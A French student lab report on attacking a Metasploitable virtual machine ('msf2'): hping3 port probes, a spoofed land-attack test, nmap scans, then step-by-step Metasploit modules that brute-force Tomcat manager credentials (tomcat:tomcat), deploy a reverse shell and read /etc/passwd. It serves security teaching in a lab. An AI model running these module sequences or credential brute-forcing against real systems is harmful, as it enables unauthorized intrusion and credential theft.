# TP2 - Sécurité Romain DUPONT DE POOTER & Ugo VALLAT

Après avoir mis en place les deux VMs, la première étape fut de réaliser divers ping sur les ports de l'autre machine afin d'observer l'état de ces ports.

## Ping de port

La première tâche fut de réaliser un `hping3 -A -p 1234 -c 3 msf2` pour observer que le port 1234 était fermé. En effet on peut constater sur un retour du ping que le __flag R__ est présent, cela signifie que le port est fermé !

La seconde tâche fut de simuler une attaque land : on envoie un paquet dont l'IP et port source sont les mêmes que la destination. La source est bien évidemment envoyé depuis une autre machine, mais ceux-ci sont spoof.
Si l'on envoie plusieurs paquets on se rend compte que le premier reçoit bien une réponse, alors que ce n'est pas possible étant donné que la réponse a été envoyé sur l'adresse spoof. Il s'agit d'une erreur (?) de hping3.

## Scan de port

__-A__ pour agressive et __-sT__ pour scan TCP
Agressive : `nmap -A -sT -n msf2`

__-sU__ pour scan UDP et __--top-ports 22__ pour les 22 ports les plus courant.
Étant donné que nous passons par UDP, il faut être root pour lancer la commande.

## Exploitation de BdD

Dans cette phase nous exploitons des vulnérabilités connus de certaines versions de PostgreSql pour obtenir un reverse shell avec un accès root sur la machine.

Après avoir utilisé l'exemple fourni avec usermap_script, il est bon d'essayer au brute force tomcat : 

- search mgr_login
- use auxiliary/scanner/http/tomcat_mgr_login
- show options
- set RHOST msf2
- set RPORT 8180
- exploit

On obtient un login successful sur tomcat:tomcat ! L'exploit a bien fonctionné et maintenant nous possédons les crédentiels d'un utilisateur.
Maintenant, passons à mgr_deploy :

- search mgr_deploy
- use exploit/multi/http/tomcat_mgr_deploy
- show options
- set RHOST msf2
- set RPORT 8180
- set httpPassword tomcat
- set httpUsername tomcat
- exploit

Grâce à cela nous obtenons un reverse shell, en faisant la commande shell pour drop dans celui-ci et en réalisant la commande whoami, on réalise que nous sommes connectés en tant que notre victime : tomcat.
Nous pouvons aussi afficher /etc/passwd

Passons maintenant au brute force SSH !


